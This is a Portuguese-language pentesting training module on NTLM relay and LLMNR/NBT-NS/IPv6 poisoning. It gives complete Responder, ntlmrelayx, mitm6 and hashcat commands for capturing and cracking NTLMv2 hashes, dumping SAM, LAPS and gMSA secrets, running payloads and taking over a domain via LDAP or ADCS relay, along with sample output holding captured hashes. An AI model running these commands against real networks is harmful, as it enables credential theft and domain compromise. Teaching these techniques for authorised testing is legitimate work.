# 🎭 07. NTLM Relay e Responder

> Um hash NTLM capturado pode ser crackeado... ou reenviado em tempo real para obter acesso imediato. Responder envenena a rede, ntlmrelayx transforma hash em shell.

<div align="center">

| ⏱️ Tempo | 📊 Nível | 🔧 Ferramentas |
|:--------:|:--------:|:--------------:|
| 80min | ⭐⭐⭐⭐ Avançado | `responder, ntlmrelayx.py, mitm6, hashcat` |

</div>

---

## 🎓 Por que isso importa?

LLMNR/NBT-NS são protocolos de fallback que permitem resolução de nomes quando DNS falha. São **não-autenticados** — qualquer host na rede pode responder. Um atacante pode envenenar essas respostas e capturar hashes NTLM de usuários que digitam shares errados ou acessam recursos inexistentes. Segundo o MITRE ATT&CK (T1557.001), NTLM relay é um vetor documentado de APTs como Wizard Spider e FIN13.

**Dois caminhos possíveis com um hash capturado:**

```
Hash capturado
     ├── CRACK offline (hashcat) → senha em texto plano
     └── RELAY direto (ntlmrelayx) → shell/dump sem crackear
```

**Referência cruzada:** Este módulo assume que você já entende o que é hash NTLM e como funciona autenticação NTLM (Arquivo 06 — Pass-the-Hash e Impacket).

---

## 📋 Pré-requisitos

| Conhecimento | Necessário? | Onde aprender |
|:-------------|:-----------:|:-------------:|
| O que é hash NTLM (challenge-response) | Sim | Arquivo 06 |
| NetExec básico | Sim | Arquivo 03 |
| Impacket basics | Sim | Arquivo 06 |
| Rede local (broadcast, multicast) | Sim | Módulo 00 |

---

## 🎯 Quando usar este módulo

- Quando LLMNR/NBT-NS estão habilitados na rede (quase sempre estão)
- Quando quer capturar hashes de usuários sem brute force
- Quando o hash é de machine account (impossível crackear — relay é a única opção)
- Quando quer domain takeover via LDAP relay

---

## 🔄 Como funciona o ataque

### LLMNR/NBT-NS/mDNS: o mecanismo de fallback

Quando um Windows não consegue resolver um nome via DNS, usa fallback multicast:

| Protocolo | Porta | Usado desde | Descrição |
|:----------|:------|:-----------|:----------|
| LLMNR | UDP/5355 | Windows Vista+ | Link-Local Multicast Name Resolution |
| NBT-NS | UDP/137 | Windows 95+ | NetBIOS Name Service (mais antigo) |
| mDNS | UDP/5353 | Windows 8+ | Multicast DNS (Bonjour/AirPrint) |

**Fluxo do ataque:**
```
1. Usuário digita \\fileshare01 (share inexistente)
2. Windows: "DNS não resolveu... vou perguntar via LLMNR/NBT-NS"
3. Windows envia query em broadcast: "Quem é \\fileshare01?"
4. Responder (atacante): "Sou eu!"
5. Windows tenta autenticar via SMB → envia NTLMv2 automaticamente
6. Responder captura o hash NTLMv2
```

### Captura vs. Relay

| Aspecto | Captura + Crack | Relay Direto |
|:--------|:----------------|:-------------|
| O que faz | Captura hash → quebra offline | Reenvia auth em tempo real para outro host |
| Velocidade | Horas/dias dependendo da senha | Instantâneo |
| Risco de detecção | Baixo (tudo offline) | Maior (gera logs no host alvo) |
| Requer senha crackável? | **Sim** | **Não** |
| Funciona com machine accounts? | **Não** (senhas de 128+ chars) | **Sim** |
| Resultado | Senha em texto plano | Shell / dump / domain admin |

**Regra prática:**
- Hash de **usuário comum** → crack (mais silencioso)
- Hash de **machine account** ou **senha forte** → relay (única opção viável)

---

## 🎭 Responder — Poisoning + Captura

### Instalação no Kali

```bash
# Pré-instalado no Kali
sudo apt install responder

# Ou do GitHub (versão mais recente)
git clone https://github.com/lgandx/Responder.git
cd Responder
pip3 install -r requirements.txt
```

### Configuração: `/etc/responder/Responder.conf`

```ini
[Responder Core]
LLMNR = On
NBTNS = On
MDNS = On
DHCP = Off
DHCPv6 = On

; === Rogue Servers ===
SMB = On          ; DESLIGAR para relay (ntlmrelayx precisa bind aqui)
HTTP = On         ; DESLIGAR para relay
HTTPS = On
SQL = On
FTP = On
LDAP = On
SMTP = On
WINRM = On

; === Custom Challenge ===
Challenge = 1122334455667788   ; Fixo para facilitar cracking
```

**⚠️ Para relay:** Desabilite SMB e HTTP (ntlmrelayx precisa bind nessas portas):
```bash
sudo sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
```

### Uso completo

```bash
# Modo padrão — poison + captura
sudo responder -I eth0 -v

# Flags essenciais
sudo responder -I eth0 \
  -w          # WPAD rogue proxy server
  -P          # ProxyAuth — força NTLM no proxy (muito efetivo)
  -f          # Fingerprinting dos hosts
  -v          # Verbose

# Modo analyze (passivo, sem poisoner)
sudo responder -I eth0 -Av
```

| Flag | Descrição |
|:-----|:----------|
| `-I eth0` | Interface de rede (obrigatório) |
| `-A, --analyze` | Modo passivo — vê requests sem responder |
| `-w, --wpad` | Inicia WPAD rogue proxy |
| `-P, --ProxyAuth` | Força autenticação NTLM/Basic no proxy |
| `-F, --ForceWpadAuth` | Força auth no wpad.dat |
| `--dhcpv6` | DHCPv6 poisoning |
| `-e IP` | Poisona requests para IP externo |
| `-b, --basic` | Retorna Basic auth (texto plano) |
| `-f, --fingerprint` | Fingerprinting dos hosts |
| `-v, --verbose` | Output verboso |

### Output esperado — Hash capturado

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : ::ffff:192.168.1.50
[SMB] NTLMv2-SSP Username : CORP\BJohnson
[SMB] NTLMv2-SSP Hash     : BJohnson::CORP:1122334455667788:A3F1B8C9E2D4567890AB1234CDEF5678:010100000000000080A490826F6FD8012C1606CFDBFD2E9C0000000002000800310051003600340001001E00570049004E002D004E005A0046004200570034003400540053003100410004003400570049004E002D004E005A004600420057003400340054005300310041002E0031005100360034002E004C004F00430041004C000300140031005100360034002E004C004F00430041004C000500140031005100360034002E004C004F00430041004C000700080080A490826F6FD80106000400020000000800300030000000000000000100000000200000821518AFAA48F41DD51468CE3FC5DB124BDF7270EBBDBDF4F3053BE048F267880A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0034000000000000000000

[HTTP] NTLMv2-SSP Client   : ::ffff:192.168.1.55
[HTTP] NTLMv2-SSP Username : CORP\admin
[HTTP] NTLMv2-SSP Hash     : admin::CORP:1122334455667788:9F8A7B6C5D4E3F2A1B0C9D8E7F6A5B4C:0101000000000000...
```

**Formato do hash:**
```
username::DOMAIN:SERVER_CHALLENGE:NT_PROOF:NTLMV2_RESPONSE_BLOB
```

### Crack com hashcat

```bash
# Salvar hash em arquivo
echo 'BJohnson::CORP:1122334455667788:A3F1B8C9...' > hash.txt

# Crack (hashcat mode 5600 para NTLMv2)
hashcat -m 5600 hash.txt rockyou.txt -r rules/best64.rule

# Ou com John
john --wordlist=rockyou.txt --format=netntlmv2 hash.txt
```

**Localização dos hashes capturados:**
```
/usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.50.txt
/usr/share/responder/logs/HTTP-NTLMv2-SSP-192.168.1.55.txt
```

---

## 🔗 ntlmrelayx.py — Relay Direto

### O que é NTLM Relay

NTLM relay intercepta a autenticação NTLM de uma vítima e a reenvia em tempo real para um terceiro alvo. O alvo vê uma autenticação legítima — **não precisa crackear nada**.

**Fluxo NTLM (challenge-response):**
```
Cliente → Servidor:  "Quero me autenticar"  (NEGOTIATE)
Servidor → Cliente:  "Aqui está o challenge" (CHALLENGE)
Cliente → Servidor:  "Aqui está a resposta"  (AUTHENTICATE)
                       ↑ ATACANTE CAPTURA E REENVIA PARA OUTRO HOST
```

**Por que funciona:** O protocolo NTLM não vincula a autenticação a um destino específico — é a falha que o relay explora.

### Instalação

```bash
# Kali (já vem com Impacket)
sudo apt install python3-impacket

# Ou via pipx (versão mais recente)
pipx install impacket

# Verificar
impacket-ntlmrelayx -h
# Impacket v0.13.1 - Copyright Fortra, LLC
```

### Uso completo

```bash
# Relay simples para SMB (dump SAM)
impacket-ntlmrelayx -t smb://192.168.1.50 -smb2support

# Relay para LDAP no Domain Controller
impacket-ntlmrelayx -t ldap://dc01.corp.local -smb2support

# Relay multi-target (lista de alvos)
impacket-ntlmrelayx -tf targets.txt -smb2support

# Executar comando no target
impacket-ntlmrelayx -t smb://192.168.1.50 -smb2support -c "whoami"

# Executar arquivo no target
impacket-ntlmrelayx -t smb://192.168.1.50 -smb2support -e payload.exe

# Shell interativo via SMB
impacket-ntlmrelayx -t smb://192.168.1.50 -smb2support -i
# Depois: nc 127.0.0.1 11000

# SOCKS proxy para sessões relayed
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Dump LAPS passwords
impacket-ntlmrelayx -t ldap://dc01.corp.local --dump-laps -smb2support

# Dump gMSA passwords
impacket-ntlmrelayx -t ldap://dc01.corp.local --dump-gmsa -smb2support

# Add computer account (qualquer user → domain takeover via RBCD)
impacket-ntlmrelayx -t ldaps://dc01.corp.local --add-computer ATTACKER$ -smb2support

# ADCS relay (ESC8 — certificate abuse)
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### Flags importantes

| Flag | Descrição |
|:-----|:----------|
| `-t, --target` | Target (IP/hostname/URL smb://server) |
| `-tf` | Arquivo com lista de targets |
| `-smb2support` | Habilita SMB2 (essencial em redes modernas) |
| `-e FILE` | Executar arquivo no target (SMB) |
| `-c COMMAND` | Executar comando no target |
| `-i` | Modo interativo (netcat na porta 11000) |
| `-socks` | SOCKS proxy para sessões relayed |
| `-6, --ipv6` | Escuta IPv6 (necessário para mitm6) |
| `--remove-mic` | Bypass CVE-2019-1040 (LDAP relay) |
| `--add-computer` | Adiciona computer account (LDAP) |
| `--delegate-access` | RBCD delegation (LDAP) |
| `--dump-laps` | Dump LAPS passwords |
| `--dump-gmsa` | Dump gMSA passwords |

### Output esperado — Relay para SMB

```
Impacket v0.13.1 - Copyright Fortra, LLC

[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Servers started, waiting for connections

[*] SMBD-Thread-3: Received connection from 192.168.1.50
[*] Authenticating against smb://192.168.1.50 as CORP/BJohnson
[*] SMB Signing is not required on 192.168.1.50
[*] Service RemoteRegistry is in stopped state
[*] Starting service to interact with Registry
[*] Target system bootKey: 0xABC123DEF456789
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9583e8fe067095ba1ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Done dumping SAM hashes for host: 192.168.1.50
```

### Output esperado — Relay para LDAP

```
[*] SMBD-Thread-5: Connection from 192.168.1.50 controlled
[*] Authenticating against ldap://dc01.corp.local as CORP/BJohnson SUCCEED
[*] User privileges found: Create user
[*] Attempting to create computer in: CN=Computers,DC=corp,DC=local
[*] Adding new computer with password: RANDOMPASSWORD123 result: OK
[*] Success! User 'attacker' now has Replication-Get-Changes-All privileges
```

---

## 🔗 mitm6 — Poisoning via IPv6

### Quando usar

Ambientes onde LLMNR/NBT-NS estão **desabilitados** mas IPv6 está **habilitado** (padrão Windows desde Vista). O mitm6 responde a DHCPv6 e DNS IPv6, configurando o atacante como DNS server da vítima.

### Como funciona

```
1. Windows emite DHCPv6 SOLICIT em broadcast
2. mitm6 responde → asigna IPv6 link-local ao atacante
3. mitm6 configura atacante como DNS server via IPv6
4. Vítima envia queries DNS para o atacante
5. mitm6 responde seletivamente (ex: wpad.corp.local → IP do atacante)
6. Vítima conecta ao WPAD fake → autentica NTLM → ntlmrelayx captura
```

**Windows sempre prefere IPv6 sobre IPv4 por padrão**, mesmo quando IPv6 não está explicitamente configurado.

### Instalação

```bash
sudo apt install mitm6
# ou
pip install mitm6
```

### Uso completo

```bash
# Básico — responde DNS para domínio
sudo mitm6 -i eth0 -d corp.local

# Filtrar host específico
sudo mitm6 -i eth0 -d corp.local -hw WS02

# Sem Router Advertisement
sudo mitm6 -i eth0 -d corp.local -a

# Host blocklist (não atingir DC)
sudo mitm6 -i eth0 -d corp.local -hb dc01.corp.local
```

| Flag | Descrição |
|:-----|:----------|
| `-i, --interface` | Interface de rede |
| `-d, --domain` | Domínio (whitelist DNS) |
| `-hw, --host-allowlist` | Hosts alvo (whitelist) |
| `-hb, --host-blocklist` | Hosts a ignorar (blocklist) |
| `-a, --no-ra` | Não envia Router Advertisements |
| `-r, --relay` | Hostname para trigger Kerberos auth |
| `-v, --verbose` | Verbose |

### Output esperado

```
mitm6 - pwning IPv4 via IPv6
Starting mitm6 using the following configuration:
Primary adapter: eth0
IPv4 address: 10.10.10.45
IPv6 address: fe80::a00:27ff:fede:92b3
Listening for DHCPv6 requests

[DHCPv6] New request from fe80::1234:5678:9abc:def0 (host=WORKSTATION01)
[DHCPv6] Assigned IPv6 address fe80::1 to host WORKSTATION01

[DNS] Query: wpad.corp.local → 10.10.10.45 (intercepted)
[DNS] Query: dc01.corp.local → 192.168.1.10 (passthrough)
```

### Integração com ntlmrelayx

**Terminal 1 — mitm6:**
```bash
sudo mitm6 -i eth0 -d corp.local -v
```

**Terminal 2 — ntlmrelayx:**
```bash
sudo ntlmrelayx.py -t ldaps://dc01.corp.local \
  -6 -wh 10.10.10.45 \
  --add-computer \
  -smb2support
```

**Fluxo:**
```
mitm6 → DHCPv6 → vítima usa atacante como DNS
mitm6 → DNS query wpad → responde IP do atacante
ntlmrelayx serve wpad.dat → vítima autentica NTLM
ntlmrelayx → relay para LDAPS → adiciona computer account
```

---

## 📋 Resumo: Quando Usar Cada Abordagem

| Cenário | Abordagem | Ferramenta |
|:--------|:----------|:-----------|
| Usuário digita share errado, senha fraca | Captura + Crack | Responder + hashcat |
| Machine account (DC01$) capturado | **Relay** (impossível crackear) | Responder + ntlmrelayx |
| Host sem SMB signing, admin logado | **Relay** (execução imediata) | Responder + ntlmrelayx |
| DC com LDAP signing desabilitado | **LDAP relay** (domain takeover) | Responder + ntlmrelayx |
| LLMNR/NBT-NS desabilitados, IPv6 ativo | **IPv6 poisoning** | mitm6 + ntlmrelayx |
| Hash capturado, quer persistência offline | Crack + pass-the-hash | hashcat + NetExec |
| Red team, quer stealth | Crack (sem logs no host) | Responder analyze + hashcat |
| Red team, quer maximum impact | Relay → ADCS → cert → full domain | ntlmrelayx --adcs |

---

## ❌ Erros Comuns

| Erro | Causa | Solução |
|:-----|:------|:--------|
| "Não captura nada" | LLMNR/NBT-NS desabilitados | Usar mitm6 (IPv6) ou DHCP poisoning |
| "Relay falha com ACCESS_DENIED" | SMB signing habilitado no alvo | Verificar com `nxc smb --gen-relay-list` |
| "Hash não crackea" | Senha forte ou machine account | Usar relay em vez de crack |
| "ntlmrelayx não bind na porta" | SMB/HTTP ainda ativos no Responder | Desligar SMB/HTTP no Responder.conf |
| "mitm6 não intercepta" | IPv6 desabilitado no alvo | Confirmar com `ipconfig /all` no target |

---

## 🧪 Labs Práticos

| # | Plataforma | Lab | O que praticar | Tempo |
|---|:----------:|:----|:---------------|:-----:|
| 1 | TryHackMe | [Responder](https://tryhackme.com/room/responder) | LLMNR poisoning, hash capture, cracking | 45min |
| 2 | TryHackMe | [Retro](https://tryhackme.com/room/retro) | NTLM relay, SMB signing, domain enum | 60min |
| 3 | HackTheBox | [Monteverde](https://app.hackthebox.com/machines/Monteverde) | LLMNR, ntlmrelayx, Azure AD, mssense | 90min |
| 4 | HackTheBox | [Blackfield](https://app.hackthebox.com/machines/Blackfield) | LLMNR poisoning, LSASS dump, kerberoasting | 120min |

---

## 📚 Referências

- [HackTricks — LLMNR/NBT-NS/mDNS Spoofing](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mixed-nets/pentesting-llmnr-nbi-ns-mdns)
- [PayloadsAllTheThings — NTLM Relay](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/NTLM%20Relay.md)
- [Impacket ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx.py)
- [Responder GitHub](https://github.com/lgandx/Responder)
- [mitm6 GitHub](https://github.com/dirkjanm/mitm6)
- [MITRE ATT&CK — NTLM Relay (T1557.001)](https://attack.mitre.org/techniques/T1557/001/)
- [Fox-IT — mitm6 Blog Post](https://blog.fox-it.com/2018/01/11/mitm6-pwning-ivp4-via-ipv6/)
- [Synacktiv — CVE-2025-33073](https://github.com/fortra/impacket/issues/2133)

---

## ✅ Validação

Após este módulo, você deve conseguir:

- [ ] Explicar como LLMNR/NBT-NS funcionam e por que são inseguros
- [ ] Configurar Responder (Responder.conf) para captura e para relay
- [ ] Capturar hash NTLMv2 com Responder e salvá-lo em formato crackável
- [ ] Crackear hash NTLMv2 com hashcat (mode 5600)
- [ ] Configurar ntlmrelayx.py para relay para SMB e LDAP
- [ ] Integrar Responder + ntlmrelayx para relay automatizado
- [ ] Usar mitm6 quando LLMNR/NBT-NS estão desabilitados
- [ ] Explicar a diferença entre capturar+crackear vs relay direto
- [ ] Escolher a abordagem correta para cada cenário
